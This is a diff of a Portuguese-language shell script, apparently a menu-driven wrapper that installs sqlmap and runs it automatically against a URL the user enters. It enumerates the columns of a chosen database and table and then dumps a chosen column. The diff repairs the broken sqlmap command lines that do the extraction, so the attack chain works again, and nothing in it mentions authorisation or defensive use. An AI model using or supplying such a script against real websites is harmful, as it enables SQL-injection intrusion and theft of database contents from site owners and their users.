@@ -35,7 +35,7 @@ case $opcao in
 	1) echo "\n\n\033[1;33mInstalando sqlmap ...";sleep 2
 git clone https://github.com/sqlmapproject/sqlmap                   echo "\n\033[1;36mSqlmap instalado com sucesso !";sleep 2 ; clear ; menu ;;		
 	2) clear ; cd $HOME ; cd sqlmap
-echo "\033[1;32m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 2
+echo "\033[1;36m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 2
 #digite a url do site
 echo
 echo "\033[1;36m\n[+]=> DIGITE A URL PARA O SQLMAP\033[1;31m"
@@ -55,8 +55,7 @@ echo
 read -p "[Tabela]>> " tabela
 #
 #Começa a listar as colunas
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabe
-la --columns
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns
 #
 #Read para digitar o nome da coluna
 echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
@@ -64,8 +63,7 @@ echo
 read -p "[coluna]=> " coluna
 #
 #Extrai todo o trabalho feito
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabe
-la -C $coluna --dump
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna --dump
 ;;
 	3) echo "SAINDO..." ; sleep 2 ; exit ;;
 
